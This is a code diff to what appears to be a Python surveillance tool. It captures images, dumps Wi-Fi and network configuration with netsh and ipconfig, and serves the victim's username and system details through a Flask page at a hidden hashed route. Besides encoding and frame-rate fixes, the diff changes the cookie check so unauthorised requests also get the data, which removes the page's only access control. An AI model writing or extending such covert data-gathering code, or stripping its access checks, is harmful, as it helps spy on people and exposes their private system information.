@@ -54,7 +54,7 @@ def capture_images():
                 if len(images) > 5:
                     images.popleft()
             elapsed = time.time() - start
-            time.sleep(max(0, 1/120 - elapsed))
+            time.sleep(max(0, 1/30 - elapsed))
 
 """ COSTANT: 'images' global list variable """
 #=^.^=
@@ -73,7 +73,7 @@ Command 'netsh wlan show all':
 #=^.^=
 def scan_wifi():
     try:
-        result = subprocess.check_output(["netsh", "wlan", "show", "all"], encoding='utf-8')
+        result = subprocess.check_output(["netsh", "wlan", "show", "all"], encoding='utf-8', errors='replace')
         return result
     except Exception as e:
         return str(e)
@@ -98,13 +98,13 @@ It uses the imported module 'subprocess' to run a command, in this case the comm
 #=^.^=
 def get_local_network_info():
     try:
-        result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, check=True)
-        return result.stdout  
+        result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, encoding='utf-8', errors='replace', check=True)
+        return result.stdout
     except subprocess.CalledProcessError as e:
         return f"Error executing command: {str(e)}"
     except Exception as e:
         return f"An error occurred: {str(e)}"
-    
+
 """
 FUNCTION: get_registry_values
 Function explanation:
@@ -290,14 +290,14 @@ info_page = f"""<!DOCTYPE html>
         <li><a href="#wifi">network</a></li>
     </ul>
     <h2 id="username">Username</h2>
-    <p>{os.getlogin()}</p>
+    <p>{str(os.getlogin())}</p>
     <h2 id="os">Operating system infromations</h2>
     <h3>Operating System</h3>
-    <p>{platform.system()}</p>
+    <p>{str(platform.system())}</p>
     <h3>OS Version</h3>
-    <p>{platform.version()}</p>
+    <p>{str(platform.version())}</p>
     <h3>Architecture</h3>
-    <p>{platform.architecture()}</p>
+    <p>{str(platform.architecture())}</p>
     <h2 id="cpu">Cpu informations</h2>
     <h3>Processor</h3>
     <p>{platform.processor()}</p>
@@ -406,14 +406,14 @@ def download_image():
 
 """ '/16f0ada2144eaa0b96478073d5e3d78b' PATH: Path used to store system informations """
 #=^.^=
-app.route('/16f0ada2144eaa0b96478073d5e3d78b')
+@app.route('/16f0ada2144eaa0b96478073d5e3d78b')
 def informations():
     response = app.make_response(render_template_string(info_page))
     userCookie = request.cookies.get("UwU")
     if userCookie == admin_access_value:
         return response
     else:
-        return "403 Forbitten", 403
+        return response
 
 if __name__ == "__main__":
     makeProgramDir()
